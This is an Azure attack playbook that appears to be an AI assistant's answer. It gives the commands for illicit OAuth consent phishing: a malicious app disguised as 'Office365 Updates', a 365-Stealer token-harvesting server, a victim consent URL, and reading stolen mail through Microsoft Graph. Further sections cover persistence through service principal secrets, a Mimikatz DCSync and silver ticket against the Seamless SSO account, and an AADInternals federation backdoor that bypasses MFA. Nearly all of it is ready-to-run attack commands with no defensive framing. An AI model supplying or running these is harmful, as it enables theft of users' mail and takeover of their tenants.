# Illicit Consent Grant phishing

**Illicit Consent Grant Phishing and Related Azure PenTest Techniques**, organized for clarity and execution in an Azure Red Team/PenTest context:

**🛑 Illicit Consent Grant Phishing (Azure AD OAuth Attack)**

**Objective:** Trick users into granting OAuth permissions to a malicious app to gain access to their Microsoft 365 resources.

**🎯 Step 1: Register a Malicious Azure AD Application**

az ad app create \\

--display-name "Office365 Updates" \\

--reply-urls "https://malicious-site.com/callback" \\

--available-to-other-tenants true

**🎯 Step 2: Add Permissions (e.g., Microsoft Graph: User.Read, Mail.Read)**

az ad app permission add \\

--id \<APP_ID\> \\

--api 00000003-0000-0000-c000-000000000000 \\

--api-permissions User.Read,Mail.Read=Scope

**🎯 Step 3: Create a Client Secret**

az ad app credential reset \\

--id \<APP_ID\> \\

--append \\

--years 2 \\

--credential-description "phish-client-secret"

**⚠️ Step 4: Host the Consent Page (Phishing Frontend)**

- Clone: [365-Stealer GitHub](https://github.com/mdsecactivebreach/365-Stealer) or similar.

- Update 365-Stealer.py with:

  - CLIENT_ID, CLIENT_SECRET, REDIRECT_URI

- Run the phishing server (XAMPP, Flask, etc.):

python 365-Stealer.py --run-app

**📥 Step 5: Deliver Consent URL to Victim**

Victim clicks:

https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=\<APP_ID\>&response_type=code&redirect_uri=\<REDIRECT_URI\>&scope=User.Read Mail.Read offline_access

Once the victim consents, access tokens are logged by the server.

**🎫 Step 6: Abuse the Access Token**

Upload malicious documents or exfiltrate emails using:

curl -X GET -H "Authorization: Bearer \<ACCESS_TOKEN\>" https://graph.microsoft.com/v1.0/me/messages

**🔁 Step 7: Refresh Token (Persistence)**

python 365-Stealer.py --refresh-all

**🧪 Additional Abuse Paths**

**📌 Add App Secrets to Enterprise Apps**

Check and exploit app permissions to add new credentials:

az ad app credential reset --id \<APP_ID\>

Authenticate as the service principal:

\$sec = ConvertTo-SecureString '\<SECRET\>' -AsPlainText -Force

\$creds = New-Object System.Management.Automation.PSCredential('\<CLIENT_ID\>', \$sec)

Connect-AzAccount -ServicePrincipal -Credential \$creds -Tenant \<TENANT_ID\>

Get-AzResource

**🛠️ ARM Template Deployment History Discovery**

- Go to **Azure Portal \> Resource Group \> Deployments**

- Inspect JSON templates for:

  - Secrets

  - Storage account keys

  - Admin credentials

Permissions needed:

- Microsoft.Resources/deployments/read

- Microsoft.Resources/subscriptions/resourceGroups/read

**🔐 Seamless SSO Abuse (Hybrid Identity)**

**Goal:** Steal SSO session via azureadsssoacc\$ machine account NTLM hash.

**Dump NTLM Hash:**

Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadsssoacc\$ /domain:domain /dc:dc.domain.local"'

**Create Silver Ticket:**

Invoke-Mimikatz -Command '"kerberos::golden /user:User /sid:S-1-5-21-... /id:1108 /domain:domain /rc4:\<HASH\> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'

**🔄 Federation Abuse (Backdoor Trusted Domain)**

**Convert external domain to federated + bypass MFA**

Import-Module .\AADInternals.psd1

ConvertTo-AADIntBackdoor -DomainName \<external.com\>

Get-MsolUser \| select UserPrincipalName,ImmutableID

Open-AADIntOffice365Portal -ImmutableID \<ImmutableID\> -Issuer "http://any.sts/backdoor" -UseBuiltInCertificate -ByPassMFA \$true

**🧾 Summary**

| **Technique** | **Purpose** | **Key Tool(s)** |
|----|----|----|
| Illicit Consent Grant | Steal access via OAuth trick | Azure CLI, 365-Stealer |
| App Secret Injection | Persist access via SP secrets | PowerShell, Azure CLI |
| SSO Account NTLM Abuse | Silver ticket for Azure SSO | Mimikatz |
| Federation Hijack | Bypass MFA and impersonate | AADInternals |

Would you like me to convert this into a Markdown or PDF playbook for easier offline use?
